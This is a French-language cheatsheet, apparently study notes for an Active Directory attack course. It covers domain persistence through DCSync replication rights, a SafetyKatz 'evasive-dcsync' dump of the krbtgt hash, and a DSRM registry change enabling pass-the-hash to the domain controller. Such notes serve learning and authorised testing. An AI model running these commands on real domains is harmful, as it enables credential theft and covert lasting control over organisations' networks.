# Cheatsheet - Persistence

> [!summary] Objectif
> Persistance spécifique AD : DCSync (extraire n'importe quel hash à volonté) et l'administrateur DSRM du DC (compte local du DC, indépendant d'un reset de mot de passe de domaine).

### DCSync — droits de réplication
```powershell
Get-DomainObjectAcl -SearchBase "DC=<DOMAIN>,DC=local" -SearchScope Base -ResolveGUIDs |
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
  ?{$_.IdentityName -match "<USER>"}
# si absent, l'ajouter depuis un contexte DA :
Add-DomainObjectAcl -TargetIdentity 'DC=<DOMAIN>,DC=local' -PrincipalIdentity <USER> -Rights DCSync
# puis extraire :
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
```
Une fois le droit `DS-Replication-Get-Changes(-All)` posé sur un user compromis, celui-ci peut extraire le hash de n'importe quel compte (dont `krbtgt`) sans jamais toucher au DC directement — persistance quasi invisible.

### DSRM — administrateur local du DC
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```
Autorise le compte DSRM (Administrator local du DC, hash extrait via `lsadump::evasive-sam` après élévation SYSTEM) à se connecter par le réseau. Ensuite Pass-the-Hash (pas OverPass) avec ce hash NTLM local → accès DC indépendant du domaine, survit à un reset de mot de passe de domaine.

> [!note] Golden/Diamond ticket sont aussi des mécanismes de persistance (clé `krbtgt`) — détaillés dans [[Cheatsheet - Tickets Kerberos]].

### Repères génériques Windows (secondaire)
```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Link** — [[Cheatsheet - Tickets Kerberos]] · [[Cheatsheet - Post-exploitation]] · [[Cheatsheet - Privilege escalation]]
